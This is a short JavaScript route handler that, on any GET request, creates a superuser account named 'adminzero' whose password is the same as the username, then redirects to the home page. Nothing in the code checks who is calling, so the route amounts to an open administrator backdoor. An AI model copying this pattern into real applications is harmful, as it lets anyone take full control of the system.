import { db } from '../db'

export async function get(event) {
  const username = 'adminzero'
  const payload = {
    username,
    password: username,
    superUser: true
  }
  const user = await db.user.create({
    data: payload
  })
  return {
    status: 302,
    headers: {
      location: '/'
    }
  }
}